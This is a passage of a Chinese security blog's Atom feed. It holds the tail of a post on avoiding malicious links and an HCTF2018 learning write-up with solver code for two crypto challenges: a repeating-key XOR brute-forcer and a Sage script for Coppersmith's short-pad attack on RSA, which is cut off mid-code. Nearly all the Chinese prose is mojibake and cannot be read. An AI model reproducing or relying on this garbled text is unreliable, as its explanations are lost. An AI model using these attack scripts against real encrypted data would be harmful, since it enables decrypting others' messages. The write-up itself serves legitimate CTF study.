class="lazyload"></p><p>ÂóØÂ∑Æ‰∏çÂ§öÂ∞±Âæó‰∫ÜÔºåÊàë‰ª¨‰πüÂ∞±‰∏çÊâìÊâ∞‰∫∫ÂÆ∂‰∫ÜÂêß„ÄÇ</p><h2 id="Â∞èÁªì"><a href="#Â∞èÁªì" class="headerlink" title="Â∞èÁªì"></a>Â∞èÁªì</h2><blockquote><p>ÊÄª‰πãÂ∞±ÊòØÔºåÊÅ∂ÊÑèÈìæÊé•Â∞ëÁÇπÂéªÁÇπÂºÄÂï¶ÔºåÂ∞±ÁÆóÁÇπÂºÄ‰∫ÜÔºåÊ≤°ÊúâËµã‰∫àÊùÉÈôêÔºåÊàñËÄÖ‰Ω†Ê≤°Êúâ‰∏ªÂä®ËæìÂÖ•Ë¥¶Âè∑ÂØÜÁ†ÅÔºåÂÜçÊàñËÄÖÊòØ‰Ω†Ê≤°ÊúâÁΩëÁªúÔºåÈÉΩÂü∫Êú¨‰∏ç‰ºöÂØºËá¥Ë¢´ÁõóÂè∑ÁöÑÂï¶„ÄÇ</p><p>ÊÅ∂ÊÑèÊñá‰ª∂Ëá™Â∑±ÈúÄË¶ÅÂ•ΩÂ•ΩÂàÜËæ®ÂíØÔºåÂ∞±‰ªé‰∏äÈù¢ÁöÑÊñπÊ≥ïÊàë‰ª¨Âü∫Êú¨‰∏äÂ∞±ÂèØ‰ª•ÈÅøÂÖçÊÅ∂ÊÑèÊñá‰ª∂‰∫ÜÔºå‰ΩÜÊòØÊÅ∂ÊÑèÊñáÊ°£ËøòÊòØÈúÄË¶ÅÊ≥®ÊÑèÔºåËôΩÁÑ∂ÊÅ∂ÊÑèÊñáÊ°£ÁöÑÈíàÂØπÊÄßÔºå‰º™ÈÄ†ÈöæÂ∫¶ÊØîËæÉÈ´òÔºå‰ΩÜÊòØ‰∏çÊéíÈô§ÊüêÂ§©‰Ω†Â∞±Ë¢´ÈíàÂØπ‰∫ÜÔºå‰Ω†ËØ¥ÊòØÂêßÔºüü§£</p></blockquote><p>Ëã•Êúâ‰∏çÁ¨¶ÔºåËøòÊúõÊñßÊ≠£„ÄÇ</p><p>Published by Yof3ng.</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;‚Ä¶‚Ä¶&lt;/p&gt;
    
    </summary>
    
      <category term="‰ø°ÊÅØÂÆâÂÖ®" scheme="http://www.yof3ng.xyz/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="ËøΩË∏™Ê∫ØÊ∫ê" scheme="http://www.yof3ng.xyz/tags/%E8%BF%BD%E8%B8%AA%E6%BA%AF%E6%BA%90/"/>
    
      <category term="‰ø°ÊÅØÂÆâÂÖ®" scheme="http://www.yof3ng.xyz/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>HCTF2018_Â≠¶‰π†ËÆ∞ÂΩï</title>
    <link href="http://www.yof3ng.xyz/2018/11/13/HCTF2018-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <id>http://www.yof3ng.xyz/2018/11/13/HCTF2018-Â≠¶‰π†ËÆ∞ÂΩï/</id>
    <published>2018-11-13T07:34:00.000Z</published>
    <updated>2019-04-02T08:45:31.596Z</updated>
    
    <content type="html"><![CDATA[<p>‚Ä¶‚Ä¶</p><a id="more"></a><h1 id="HCTF2018-Â≠¶‰π†ËÆ∞ÂΩï"><a href="#HCTF2018-Â≠¶‰π†ËÆ∞ÂΩï" class="headerlink" title="HCTF2018_Â≠¶‰π†ËÆ∞ÂΩï"></a>HCTF2018_Â≠¶‰π†ËÆ∞ÂΩï</h1><blockquote><p>ÈáçÊï¥ÊóóÈºìÂÜç‰∏äË∑Øüò≠ÔºåhctfÊ≤°Â§™ÈáçËßÜ(ÂÖ∂ÂÆûÈáçËßÜ‰∫Ü‰πü‰∏ç‰ºöÂÅö)ÔºåÂè™ËÉΩËµõÂêéÁúãÁúãÂ∏àÂÇÖ‰ª¨ÁöÑwriteupÂ≠¶‰π†‰∏ÄÊ≥¢„ÄÇÊé•‰∏ãÊù•ÊâìÁÆóÂ≠¶‰∏Ä‰∏ãÂü∫Á°ÄÁöÑÂØÜÁ†ÅÂ≠¶Ôºå‰∏çÁÑ∂ËÄÅÊòØÊáµÈÄºÂèØÊ≤°Áî®Âë¢„ÄÇ</p></blockquote><p>ÂèÇËÄÉÈìæÊé•Ôºö</p><p><a href="https://xz.aliyun.com/t/3257#toc-17" target="_blank" rel="noopener">HCTF2018_CNSS_WP</a></p><p><a href="https://xz.aliyun.com/t/3256#toc-21" target="_blank" rel="noopener">HCTF2018_ Â§©Êû¢ _WP</a></p><p><a href="https://xz.aliyun.com/t/3253#toc-23" target="_blank" rel="noopener">HCTF2018_Eur3kA_WP</a></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="crypto1-Xor-game"><a href="#crypto1-Xor-game" class="headerlink" title="crypto1 - Xor_game"></a>crypto1 - Xor_game</h3><blockquote><p>È¢òÁõÆÁªôÂá∫‰∫Ü‰∏Ä‰∏™cipher.txtË£ÖÊúâÂØÜÊñáÔºå‰ª•Âèä‰∏Ä‰∏™Âä†ÂØÜËÑöÊú¨ÔºåÂÜÖÂÆπÂ¶Ç‰∏ãÔºö</p><p>cipher.txt:</p><pre class=" language-python"><code class="language-python">ciMbOQxffx0GHQtSBB0QSQIORihXVQAUOUkHNgQLVAQcAVMAAAMCASFEGQYcVS8BNh8BGAoHFlMAABwCTSVQC2UdMQx5FkkGEQQAAVMAAQtHRCNLF0NSORscMkkaHABSExIYBQseUmBCFgtSKwEWfwELFRcGbzwEDABHVS8DDAcXfwUcMQwCDUUBCgYYSQEBATNKGwQeOkkbPhsYERYGDB0TYzwCUSVCDE8dKh0BNg4GAAkLSVMWHBpHQCxQF08AOhkWPh1OAA0XRQQRBQJKQyVKFghSMA95Gh8LGhEHBB8YEE4UViFaEQEVfwAdfx0GEUUWAAARGxpHTiFQERx4FkkROgUHERMXRTpUCANtYy9RFk8TLEkHNwxOFhcbAhsASR0STC1GCk8UMwYEOhsdfiEdRR0bHU4QSDRLHR0XO0kGMQ0LEgATERYQSQgORDJaWAsXMgYdfxsbGAB4LRYVGxpHUyFXHU8TMQ1TPRsLFREaDB0TSRoIASJGGR1SKwEWfwUBFQFSChVUHQYCASNWFQ0XLRocMgxkNgoAABd<span class="token operator">+</span>PRkIKwkDEAoTLQ1TKwELVAgHFhoXRU4BUy9OWBsaOkkeMAYAVAQcAVMXCBwEQDNQci4HJwAfNggcDUUXHQcGDAMCASFGCxsaOh0aPAAdGUUQBBoASRoIASNCCBsHLQxTMgAdABx4IxoYBQcJRmBXEApSNgcHOgcdEUUeDBURRU4FVDQDGQMBMEkVNgUCHQsVRQccDE4XVDJGcjsaOhsWfwgcEUUTCQQVEB1HTCVOFx0bOhpTKwEcGxAVDRwBHU4TSSUDHQ4AKwF5FkkMEQkbAAURSSdHQC0pPAYXO0kSLEkaHABSFAYdDBpHQyVCDRsLfwYVfwgbABAfC1MYDA8RRDMpKwcXMQ5TNhpOGgoGRRAcCAEUDWBQFQAZOkkUOhoaARcXbzYCDABHVilPDE8TMxocfxsLAAQbCxYQSQwITyUDCB0dKg0fJkk<span class="token operator">/</span>HQsVRTURBwlHTDVQGwMXVSYQPBwCAG8mDQERDGQuAShGGR1SMwYFOkVOPUUQAB8dDBgCASlNWAMdKQx5EwYYEUUbFlMVSR4ITiwDFwlSLB0BKg4JGAwcAlMWBRsCDCdRHQocfwgfOAgLfiQBRRcRGgELQDRGWAIbPBsccgsbBhYGRRwSSRkOTyQpOgMXOg0aMQ5OAA0ACgYTAU4KWGBVHQYcLGMqOggcB0UBERIAAAEJRCQDEQFSKwEWfwsLGAwXA3kyBhsVKwkDGgoeNgwFOkkaHAQGRRIYBU4EQC4DEAoTLWM2KQwAVAQcERoXAB4GVSUDHAYBPBsWKwxCVCxSCBYASRoPRGBMDAcXLUkHNwwHBkUdEh1<span class="token operator">+</span>OgEKRGBAGQFSMQYHfw4cFRYCRQccDE4KTi1GFht4EwwVK0kaG0UGDRZULA8UVWBXF08VMEkkOhoaWEUGDRZUDQsGRWBODRwGfwccK0kcEREHFx1UHQFHTy9UEAoAOmMgOgxCVCxSEhYVG049QC4DPgMdKAwBLEkBGkUfHFMcDA8DDWBKFk8UKgUffwsCGwofRRIYBgAAATRLHU8FPhBTPgUCVBEaAFMDCBdtZzJGCRoXMR0fJkkDHRYBABdUGgEKRGwDGhoGfwgfLAZOEAAXFR8NSQMIVyVHWA0Lfx4aMQ1CVAMACgAARU4UTy9UWAAAfxsSNgdkMgwEAHkkGw8NTyEDKA4APgQaKwhCVBYdCh1UCB1HUi9MFk8TLGMfNg8LVAcXRRERCBsTSCZWFE8eNgIWfxobGQgXF1MSBQEQRDJQWA4cO0kXOggaHEUeDBgRSQ8SVTVOFk8eOggFOhpkNQkBClMXCBwCASFBFxoGfx4bPh1OHAQB</code></pre><p>challenge.py:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#challenge.py</span><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>strxor <span class="token keyword">import</span> strxor<span class="token keyword">import</span> base64<span class="token keyword">import</span> random<span class="token keyword">def</span> <span class="token function">enc</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>    key <span class="token operator">=</span> <span class="token punctuation">(</span>key <span class="token operator">*</span> <span class="token punctuation">(</span>len<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">/</span> len<span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span>len<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> strxor<span class="token punctuation">(</span>data<span class="token punctuation">,</span> key<span class="token punctuation">)</span>poem <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'poem.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">"hctf{xxxxxxxxxxx}"</span><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'cipher.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>enc<span class="token punctuation">(</span>poem<span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; ÈÄöËøáÁÆÄÂçïÂàÜÊûêÂÖ∂ÈÄªËæëÔºåÂèØ‰ª•Áü•ÈÅìxor_keyÂ∞±ÊòØflagËä±Êã¨Âè∑‰∏≠ÁöÑÂÜÖÂÆπÔºåÈÄöËøáËØ•xor_keyÂØπpoem.txt‰∏≠ÁöÑÂÜÖÂÆπËøõË°åÂä†ÂØÜÔºåÂπ∂‰∏îÈúÄË¶ÅÂØπÂ∫îÈïøÂ∫¶„ÄÇÂõ†‰∏∫poem.txt‰∏≠ÊòØ‰∏ÄÈ¶ñËØóÔºåËØó‰∏≠ÂèØËÉΩ‰ºöÂá∫Áé∞Â≠óÊØçÔºåÊï∞Â≠óÔºåÂºïÂè∑ÔºåÊç¢Ë°åÁ≠âÁ≠âÂêàÊ≥ïÂ≠óÁ¨¶ÔºåÁî±‰∫éÊàë‰ª¨Âè™ÊúâÂØÜÊñáÔºåÂπ∂‰∏îÁü•ÈÅìxorÁöÑËßÑÂæãÔºåÊòØxor_keyÁöÑÈïøÂ∫¶Êù•ÂÜ≥ÂÆöÁöÑÔºåÈÇ£‰πàÂ∞±ÂèØ‰ª•ÈÄöËøáÈÅçÂéÜÂä†‰∏äÁÆÄÂçïÁöÑÂà§Êñ≠ÔºåÂÜôÂá∫Â¶Ç‰∏ã‰ª£Á†Å(ËøôÊòØÊúÄÁÆÄÂçïÁöÑËß£Ê≥ïÔºåÂèÇÁÖß<a href="https://xz.aliyun.com/t/3257#toc-17" target="_blank" rel="noopener">ÁîµÂ≠êÁßëÂ§ßCNSSÊàòÈòüÁöÑwp</a> ÔºâÔºö</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#exp.py</span><span class="token keyword">import</span> base64<span class="token comment" spellcheck="true">#Ê£ÄÊµãÊòØÂê¶‰∏∫ËØóÊ≠åÊ≠£Â∏∏Â≠óÁ¨¶</span><span class="token keyword">def</span> <span class="token function">invalid</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> chr<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token string">'{}[]@#%^*=+'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token comment" spellcheck="true">#Êç¢Ë°åÁ¨¶‰∏∫Ê≠£Â∏∏Â≠óÁ¨¶</span>    <span class="token keyword">if</span> x <span class="token operator">==</span> <span class="token number">10</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> x <span class="token operator">&lt;=</span> <span class="token number">31</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> <span class="token boolean">False</span>cipher <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>open<span class="token punctuation">(</span><span class="token string">'cipher.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># ÂèØËÉΩÁöÑxor_keyÈïøÂ∫¶</span><span class="token keyword">for</span> L <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    c <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    cc <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#ÂØπxor_keyÁöÑÊØè‰∏Ä‰ΩçËøõË°åÊûö‰∏æ</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>L<span class="token punctuation">)</span><span class="token punctuation">:</span>        t <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> cand <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flag <span class="token operator">=</span> <span class="token boolean">True</span>            <span class="token comment" spellcheck="true">#Ê≠•Èïø‰∏∫xor_keyÈïøÂ∫¶ÔºåËøõË°åÊµãËØï</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span>i<span class="token punctuation">,</span> len<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">,</span> L<span class="token punctuation">)</span><span class="token punctuation">:</span>                tmp <span class="token operator">=</span> cand <span class="token operator">^</span> cipher<span class="token punctuation">[</span>j<span class="token punctuation">]</span>                <span class="token comment" spellcheck="true">#Ëã•‰∏ç‰∏∫Ê≠£Â∏∏Â≠óÁ¨¶ÔºåÂàôÂ∞ÜflagÊ†áÂøó‰ΩçÁΩÆ‰∏∫False,‰∏ç‰ºöÂ∞ÜËØ•ascii‰Ωú‰∏∫ÂèØËÉΩÁöÑxor_keyÂ≠óÁ¨¶</span>                <span class="token keyword">if</span> invalid<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">:</span>                    flag <span class="token operator">=</span> <span class="token boolean">False</span>                    <span class="token keyword">break</span>            <span class="token comment" spellcheck="true">#Â∞ÜÁ¨¶ÂêàÊù°‰ª∂ÁöÑasciiÂØπÂ∫îÁöÑÂ≠óÁ¨¶Ê∑ªÂä†Âà∞ÂØπÂ∫îxor_keyÂ≠óÁ¨¶‰ΩçÁΩÆÁöÑÂàóË°®</span>            <span class="token keyword">if</span> flag<span class="token punctuation">:</span>                t<span class="token punctuation">.</span>append<span class="token punctuation">(</span>chr<span class="token punctuation">(</span>cand<span class="token punctuation">)</span><span class="token punctuation">)</span>        c<span class="token punctuation">.</span>append<span class="token punctuation">(</span>len<span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span>        cc<span class="token punctuation">.</span>append<span class="token punctuation">(</span>t<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token number">0</span> <span class="token operator">not</span> <span class="token keyword">in</span> c<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>L<span class="token punctuation">,</span> c<span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>L<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\t'</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> cc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>ËøêË°åÊïàÊûúÔºö</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113163611.png" alt=""></p><p>ËøôËôΩÁÑ∂‰∏çÊòØÊúÄÁ≤æÁ°ÆÁöÑÊñπÊ≥ïÔºå‰ΩÜÂèØ‰ª•ËØ¥ÊòØÁÆÄ‰æøÈ´òÊïà‰∫ÜÔºåËøòÊúâÂ∞±ÊòØÈÄöËøáxortoolÊù•ÁàÜÁ†¥keyÁöÑÈïøÂ∫¶Ôºå‰ª•ÂèäÂèØËÉΩÁöÑÂ≠óÁ¨¶‰∏≤„ÄÇÊàñËÄÖÊü•Áúã<a href="https://xz.aliyun.com/t/3256#toc-22" target="_blank" rel="noopener">Ê±âÊòéÁ†ÅÂéüÁêÜ</a>„ÄÇ</p><p>ÈÄöËøáxortoolÁû¨Èó¥ÂæóÂà∞keyÈïøÂ∫¶ÊúÄÂèØËÉΩ‰∏∫21ÔºàËÆ∞ÂæóÂØÜÊñáÈúÄË¶ÅÊòØbase64Ëß£ÂØÜÂêéÁöÑÁúüÊ≠£ÂÜÖÂÆπÔºâÔºö</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113170451.png" alt=""></p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113172004.png" alt=""></p><p>ÁöÑÁ°ÆÂèØ‰ª•ÁúãÂà∞ÁàÜÁ†¥Âá∫Êù•ÁöÑkeyÂ§ßÂ§öÊï∞‰∏çÊàêÂΩ¢ÔºåÊØîËæÉÈöæÁåúÂá∫Ôºå‰∏çËøáÂæóÂà∞‰∫ÜkeyÁöÑÈïøÂ∫¶Â∞±ÊØîËæÉÁÆÄÂçï‰∫Ü„ÄÇ</p><h3 id="crypto2-Xor-RSA"><a href="#crypto2-Xor-RSA" class="headerlink" title="crypto2 - Xor?RSA"></a>crypto2 - Xor?RSA</h3><blockquote><p>ËøôÈ¢òÊ∂âÂèäÂà∞RSAÁöÑ‰∏ÄÁßçÊîªÂáªÊñπÂºèÔºöpaddingËøáÁü≠ÔºåÂèØ‰ª•Âà©Áî®Coppersmith‚Äôs short-pad attack„ÄÇ</p><p><a href="https://www.anquanke.com/post/id/84632" target="_blank" rel="noopener">CTF‰∏≠RSAÂ∏∏ËßÅÊîªÂáªÊñπÊ≥ï</a></p><p><a href="https://www.anquanke.com/post/id/158944" target="_blank" rel="noopener">ÊµÖÊûêRSA Padding Attack-‰∏ÄÂè∂È£òÈõ∂</a></p><p>È¢òÁõÆÊ∫êÁ†ÅÔºö</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> SocketServer<span class="token keyword">import</span> string<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> random<span class="token keyword">import</span> requests<span class="token keyword">import</span> json<span class="token keyword">from</span> flag <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">class</span> <span class="token class-name">ThreadedTCPServer</span><span class="token punctuation">(</span>SocketServer<span class="token punctuation">.</span>ThreadingMixIn<span class="token punctuation">,</span> SocketServer<span class="token punctuation">.</span>TCPServer<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">class</span> <span class="token class-name">RSATCPHandler</span><span class="token punctuation">(</span>SocketServer<span class="token punctuation">.</span>BaseRequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">handle</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"Welcome to flag getting system\ngive me your token > "</span><span class="token punctuation">)</span>        token <span class="token operator">=</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token operator">not</span> verify<span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"token error\n"</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            p <span class="token operator">=</span> getStrongPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>            q <span class="token operator">=</span> getStrongPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>            n <span class="token operator">=</span> p <span class="token operator">*</span> q            e <span class="token operator">=</span> <span class="token number">5</span>            nbits <span class="token operator">=</span> size<span class="token punctuation">(</span>n<span class="token punctuation">)</span>            kbits <span class="token operator">=</span> nbits <span class="token operator">//</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> e <span class="token operator">*</span> e<span class="token punctuation">)</span>            m1 <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span>nbits<span class="token punctuation">)</span>            m2 <span class="token operator">=</span> m1 <span class="token operator">^</span> getRandomNBitInteger<span class="token punctuation">(</span>kbits<span class="token punctuation">)</span>            c1 <span class="token operator">=</span> pow<span class="token punctuation">(</span>m1<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>            c2 <span class="token operator">=</span> pow<span class="token punctuation">(</span>m2<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"n="</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"c1="</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>c1<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"c2="</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>c2<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"now give me you answer\n"</span><span class="token punctuation">)</span>            ans1 <span class="token operator">=</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>            ans2 <span class="token operator">=</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> str<span class="token punctuation">(</span>ans1<span class="token punctuation">)</span> <span class="token operator">==</span> str<span class="token punctuation">(</span>m1<span class="token punctuation">)</span> <span class="token operator">and</span> str<span class="token punctuation">(</span>ans2<span class="token punctuation">)</span> <span class="token operator">==</span> str<span class="token punctuation">(</span>m2<span class="token punctuation">)</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>FLAG<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"wrong answer\n"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    HOST<span class="token punctuation">,</span> PORT <span class="token operator">=</span> <span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> <span class="token number">10086</span>    server <span class="token operator">=</span> ThreadedTCPServer<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">,</span> RSATCPHandler<span class="token punctuation">)</span>    server<span class="token punctuation">.</span>serve_forever<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></blockquote><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113173105.png" alt=""></p><p>ËøôÁßçÁõÆÂâçÊØîËæÉÂ∏∏ËßÅÁöÑÂØÜÁ†ÅÂ≠¶Âá∫È¢òÊñπÂºèÔºå‰πãÂâç‰∏äÊµ∑Á¨¨ÂõõÂ±äÂ§ßÂ≠¶ÁîüÁΩëÁªúÂÆâÂÖ®Á´ûËµõ‰∏≠‰πüÊòØÁ±ª‰ººÁöÑÂΩ¢Âºè„ÄÇ</p><p>Ê†πÊçÆÁΩë‰∏äCoppersmith‚Äôs short-pad attackÁöÑsageËÑöÊú¨ËÆ°ÁÆóÂæóÂà∞m1,m2‰ªéËÄågetflag:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#.sageÊñá‰ª∂</span><span class="token keyword">def</span> <span class="token function">short_pad_attack</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    PRxy<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token punctuation">,</span>y<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>    PRx<span class="token punctuation">.</span><span class="token operator">&lt;</span>xn<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>    PRZZ<span class="token punctuation">.</span><span class="token operator">&lt;</span>xz<span class="token punctuation">,</span>yz<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>    g1 <span class="token operator">=</span> x<span class="token operator">^</span>e <span class="token operator">-</span> c1    g2 <span class="token operator">=</span> <span class="token punctuation">(</span>x<span class="token operator">+</span>y<span class="token punctuation">)</span><span class="token operator">^</span>e <span class="token operator">-</span> c2    q1 <span class="token operator">=</span> g1<span class="token punctuation">.</span>change_ring<span class="token punctuation">(</span>PRZZ<span class="token punctuation">)</span>    q2 <span class="token operator">=</span> g2<span class="token punctuation">.</span>change_ring<span class="token punctuation">(</span>PRZZ<span class="token punctuation">)</span>    h <span class="token operator">=</span> q2<span class="token punctuation">.</span>resultant<span class="token punctuation">(</span>q1<span class="token punctuation">)</span>    h <span class="token operator">=</span> h<span class="token punctuation">.</span>univariate_polynomial<span class="token punctuation">(</span><span class="token punctuation">)</span>    h <span class="token operator">=</span> h<span class="token punctuation">.</span>change_ring<span class="token punctuation">(</span>PRx<span class="token punctuation">)</span><span class="token punctuation">.</span>subs<span class="token punctuation">(</span>y<span class="token operator">=</span>xn<span class="token punctuation">)</span>    h <span class="token operator">=</span> h<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>    kbits <span class="token operator">=</span> n<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">//</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>e<span class="token operator">*</span>e<span class="token punctuation">)</span>    diff <span class="token operator">=</span> h<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token 